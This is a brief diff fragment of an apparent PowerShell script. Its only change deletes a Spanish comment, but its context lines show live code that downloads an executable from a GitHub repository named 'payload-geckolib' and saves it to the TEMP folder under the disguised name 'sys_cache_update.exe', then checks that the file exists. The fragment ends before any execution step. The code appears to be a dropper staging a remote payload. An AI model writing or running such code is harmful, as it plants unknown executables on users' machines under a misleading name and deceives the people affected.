@@ -96,7 +96,6 @@ try {
     $url = "https://github.com/fridaynightmare/payload-geckolib/raw/refs/heads/main/scanner.exe"
     $dest = "$env:TEMP\sys_cache_update.exe"
 
-    # Asegurar descarga
     (New-Object Net.WebClient).DownloadFile($url, $dest)
 
     if (Test-Path $dest) {
